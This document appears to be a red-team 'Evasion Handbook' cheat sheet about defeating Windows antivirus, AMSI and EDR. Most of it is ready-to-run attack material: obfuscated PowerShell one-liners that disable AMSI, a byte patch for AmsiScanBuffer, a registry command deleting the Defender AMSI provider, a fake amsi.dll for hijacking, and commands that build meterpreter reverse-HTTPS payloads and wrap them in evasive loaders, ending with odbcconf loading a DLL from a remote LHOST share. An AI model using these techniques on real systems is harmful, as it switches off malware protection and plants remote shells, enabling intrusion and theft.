# Evasion Handbook

- [Resources](#resources)

## Table of Contents

- [AMSI](#amsi)
- [AntiVirus Evasion](#antivirus-evasion)
- [Donut](#donut)
- [Freeze](#freeze)
- [ScareCrow](#scarecrow)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AMSI Bypass Powershell | This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance methods i found on different Blog Posts. | https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell |
| AmsiHook | AmsiHook is a project I created to figure out a bypass to AMSI via function hooking. | https://github.com/tomcarver16/AmsiHook |
| AMSI.fail | AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. | http://amsi.fail |
| charlotte | c++ fully undetected shellcode launcher ;) | https://github.com/9emin1/charlotte |
| Chimera | Chimera is a PowerShell obfuscation script designed to bypass AMSI and commercial antivirus solutions. | https://github.com/tokyoneon/Chimera |
| Codecepticon | .NET/PowerShell/VBA Offensive Security Obfuscator | https://github.com/sadreck/Codecepticon |
| ConfuserEx | An open-source, free protector for .NET applications | https://github.com/yck1509/ConfuserEx |
| DefenderCheck | Identifies the bytes that Microsoft Defender flags on. | https://github.com/matterpreter/DefenderCheck |
| Donut | Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters. | https://github.com/TheWover/donut |
| EDRSandBlast | EDRSandBlast is a tool written in C that weaponize a vulnerable signed driver to bypass EDR detections (Notify Routine callbacks, Object Callbacks and ETW TI provider) and LSASS protections. | https://github.com/wavestone-cdt/EDRSandblast |
| Freeze | Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods | https://github.com/Tylous/Freeze |
| Invoke-Obfuscation | PowerShell Obfuscator | https://github.com/danielbohannon/Invoke-Obfuscation |
| LimeLighter | A tool for generating fake code signing certificates or signing real ones | https://github.com/Tylous/Limelighter |
| macro_pack | macro_pack is a tool by @EmericNasi used to automatize obfuscation and generation of Office documents, VB scripts, shortcuts, and other formats for pentest, demo, and social engineering assessments. | https://github.com/sevagas/macro_pack |
| mimikatz Obfuscator | This script downloads and slightly obfuscates the mimikatz project. | https://gist.github.com/imaibou/92feba3455bf173f123fbe50bbe80781 |
| Mortar Loader | Evasion technique to defeat and divert detection and prevention of security products (AV/EDR/XDR) | https://github.com/0xsp-SRD/mortar |
| neo-ConfuserEx | Updated ConfuserEX, an open-source, free obfuscator for .NET applications | https://github.com/XenocodeRCE/neo-ConfuserEx |
| NET-Obfuscate | Obfuscate ECMA CIL (.NET IL) assemblies to evade Windows Defender AMSI  | https://github.com/BinaryScary/NET-Obfuscate |
| NetLoader | Loads any C# binary in mem, patching AMSI + ETW. | https://github.com/Flangvik/NetLoader |
| NimBlackout | Kill AV/EDR leveraging BYOVD attack | https://github.com/Helixo32/NimBlackout |
| Nimcrypt2 | .NET, PE, & Raw Shellcode Packer/Loader Written in Nim | https://github.com/icyguider/Nimcrypt2 |
| NimPackt-v1 | Nim-based assembly packer and shellcode loader for opsec & profit | https://github.com/chvancooten/NimPackt-v1 |
| Obfuscar | Open source obfuscation tool for .NET assemblies | https://github.com/obfuscar/obfuscar |
| Obfuscator-LLVM | The aim of this project is to provide an open-source fork of the LLVM compilation suite able to provide increased software security through code obfuscation and tamper-proofing. | https://github.com/obfuscator-llvm/obfuscator |
| OffensivePipeline | OffensivePipeline allows to download, compile (without Visual Studio) and obfuscate C# tools for Red Team exercises.  | https://github.com/Aetsu/OffensivePipeline |
| PowerShell Encoder (CyberChef) | Receipe for encoding PowerShell Payloads for Windows | https://cyberchef.io/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D') |
| PSByPassCLM | Bypass for PowerShell Constrained Language Mode | https://github.com/padovah4ck/PSByPassCLM |
| Raikia's Hub | Online repository for Red Teamers | https://raikia.com/tool-powershell-encoder/ |
| ScareCrow | Payload creation framework designed around EDR bypass. | https://github.com/Tylous/ScareCrow |
| SharpEvader | This is a python script which automatically generates metepreter tcp or https shellcode encodes it and slaps some Behavioural detection in a c# Project for you to build and run | https://github.com/Xyan1d3/SharpEvader |
| ShellcodeEncryptor | A simple shell code encryptor/decryptor/executor to bypass anti virus. | https://github.com/plackyhacker/Shellcode-Encryptor |
| ShellGhost | A memory-based evasion technique which makes shellcode invisible from process start to end. | https://github.com/lem0nSec/ShellGhost |
| Shikata Ga Nai | Shikata ga nai (仕方がない) encoder ported into go with several improvements. | https://github.com/EgeBalci/sgn |
| Simple Injector | A simple injector that uses LoadLibraryA | https://github.com/tomcarver16/SimpleInjector |
| TreatCheck | Identifies the bytes that Microsoft Defender / AMSI Consumer flags on. | https://github.com/rasta-mouse/ThreatCheck |
| unicorn | Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18. | https://github.com/trustedsec/unicorn |
| Veil | Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions. | https://github.com/Veil-Framework/Veil |
| WorldWritableDirs.txt | World-writable directories in %windir% | https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56 |
| yetAnotherObfuscator | C# obfuscator that bypass windows defender | https://github.com/0xb11a1/yetAnotherObfuscator |

## AMSI

### Test String

```c
PS C:\> $str = 'amsiinitfailed'
```

### Simple Bypass

```c
PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
```

### Obfuscated Bypass Techniques

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

```c
PS C:\> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```


### Bypass on Windows 11

> https://github.com/senzee1984/Amsi_Bypass_In_2023

```c
PS C:\> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
```

```c
PS C:\>  $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
```

### PowerShell Downgrade

```c
PS C:\> powershell -version 2
```

### Fabian Mosch / Matt Graeber Bypass

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### Base64 Encoded

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

### Hooking

> https://github.com/tomcarver16/SimpleInjector

> https://github.com/tomcarver16/AmsiHook

```c
PS C:\> .\SimpleInjector.exe powershell.exe .\AMSIHook.dll
```

### Memory Patching

> https://github.com/rasta-mouse/AmsiScanBufferBypass

The patch return always `AMSI_RESULT_CLEAN` and shows the following line.

```c
static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
```

#### Load and Execute the DLL

```c
[System.Reflection.Assembly]::LoadFile("C:\Users\pentestlab\ASBBypass.dll")
[Amsi]::Bypass()
```

The tool `AMSITrigger v3` can be used to discover the strings which are making calls to the `AmsiScanBuffer`.

> https://github.com/RythmStick/AMSITrigger

```c
PS C:\> .\AmsiTrigger_x64.exe -i .\ASBBypass.ps1
```

Obfuscating the contained code within the script will evade `AMSI`.

```c
${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
Add-Type ${_/==\_/\__/===\_/}
${__/=\/==\/\_/=\_/} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA'))))
${___/====\__/=====} = [Win32]::GetProcAddress(${__/=\/==\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
${/==\_/=\/\__/\/\/} = 0
[Win32]::VirtualProtect(${___/====\__/=====}, [uint32]5, 0x40, [ref]${/==\_/=\/\__/\/\/})
${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)
```

### Forcing an Error

Forcing `AMSI` to fail (amsiInitFailed) will result that no scan will be initiated for the current process.

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Avoiding the use of strings with the usage of variables can also evade `AMSI`.

```c
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

Forcing an error in order to send the flag in a legitimate way is another option. This bypass allocates a memory region for the `amsiContext` and since the `amsiSession` is set to null it will result an error.

```c
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
```

An obfuscated version of this bypass can be found on [AMSI.fail](https://amsi.fail/).

```c
$fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", "NonPublic,Static").SetValue($null, [IntPtr]$fwi);
```

### Registry Key Modification

`GUID` for Windows Defender.

```c
KLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
```

The key can be removed to stop the `AMSI provider` to perform `AMSI inspection` and evade the control.
Notice that this requires elevated rights.

```c
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
```

### DLL Hijacking

Requirement is to create a non-legitimate `amsi.dll` and place it in the same folder as the `64 Bit` version of `PowerShell`. The `PowerShell` executable also can be copied into a writeable directory.

```c
#include "pch.h"
#include "iostream"

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        LPCWSTR appName = NULL;
        typedef struct HAMSICONTEXT {
            DWORD       Signature;            // "AMSI" or 0x49534D41
            PWCHAR      AppName;           // set by AmsiInitialize
            DWORD       Antimalware;       // set by AmsiInitialize
            DWORD       SessionCount;      // increased by AmsiOpenSession
        } HAMSICONTEXT;
        typedef enum AMSI_RESULT {
            AMSI_RESULT_CLEAN,
            AMSI_RESULT_NOT_DETECTED,
            AMSI_RESULT_BLOCKED_BY_ADMIN_START,
            AMSI_RESULT_BLOCKED_BY_ADMIN_END,
            AMSI_RESULT_DETECTED
        } AMSI_RESULT;

        typedef struct HAMSISESSION {
            DWORD test;
        } HAMSISESSION;

        typedef struct r {
            DWORD r;
        };

        void AmsiInitialize(LPCWSTR appName, HAMSICONTEXT * amsiContext);
        void AmsiOpenSession(HAMSICONTEXT amsiContext, HAMSISESSION * amsiSession);
        void AmsiCloseSession(HAMSICONTEXT amsiContext, HAMSISESSION amsiSession);
        void AmsiResultIsMalware(r);
        void AmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);
        void AmsiScanString(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);
        void AmsiUninitialize(HAMSICONTEXT amsiContext);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```c
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
```

## AntiVirus Evasion

### Basic Notes

| Antivirus Detections | Evasion |
| --- | --- |
| Signatures | Custom Payloads |
| | Obfuscation |
| | - Encoding/Encryption |
| | - Scrambling ('mimikatz' -> 'miMi'+'KatZ') |
| Heuristics/Behavioral | Polymorphism |
| | Custom Payloads |

## Donut

> https://github.com/TheWover/donut

### Installation

```c
$ make
$ make clean
$ make debug
```

### Obfuscation

```c
$ donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
```

## Freeze

> https://github.com/Tylous/Freeze

### Installation

```c
$ git clone https://github.com/Tylous/Freeze
$ cd Freeze
$ go build Freeze.go
```

```c
$ go get golang.org/x/sys/windows
```

### Common Commands

```c
$ ./Freeze -I <FILE>.bin -O <FILE>.exe
$ ./Freeze -I <FILE>.exe -O <FILE>.exe
$ ./Freeze -I <FILE>.bin -encrypt -sandbox -O <FILE>.exe
$ ./Freeze -I <FILE>.exe -encrypt -sandbox -O <FILE>.exe
$ ./Freeze -I <FILE>.bin -encrypt -sandbox -process "C:\\Windows\\System32\\msedge.exe" -O <FILE>.exe
$ ./Freeze -I <FILE>.exe -encrypt -sandbox -process "C:\\Windows\\System32\\msedge.exe" -O <FILE>.exe
```

## ScareCrow

> https://github.com/Tylous/ScareCrow

### Payloads

#### Shellcode Payload Creation with msfvenom

```c
$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f raw -o <FILE>.bin
```

#### .msi-File Payload Creation with msfvenom

```c
$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f exe -o <FILE>.exe
```

#### Listener

```c
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_https
```

### Obfuscation

#### Shellcode

```c
$ ScareCrow -I <FILE>.bin -Loader binary -domain <FAKE_DOMAIN>
```

#### DLL Side-Loading

```c
$ ScareCrow -I <FILE>.bin -Loader dll -domain <FAKE_DOMAIN>
```
#### Windows Script Host

```c
$ ScareCrow -I <FILE>.bin -Loader msiexec -domain <FAKE_DOMAIN> -O payload.js
```

#### Control Panel Files

```c
$ ScareCrow -I <FILE>.bin -Loader control -domain <FAKE_DOMAIN>
```

#### Process Injection

```c
$ ScareCrow -I <FILE>.bin -injection "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" -domain <FAKE_DOMAIN>
```

### Renaming Payload

```c
$ mv <FILE>.dll <FILE>32.dll
```

### Execution

```c
PS C:\> rundll32.exe .\<FILE>32.dll,DllRegisterServer
```

or

```c
PS C:\> regsvr32 /s .\<FILE>32.dll
```

For `.cpl-Files` a simple double click is enough to execute them.

### Evasion focused Execution

```c
PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>.dll}
PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>_dll.txt}
```
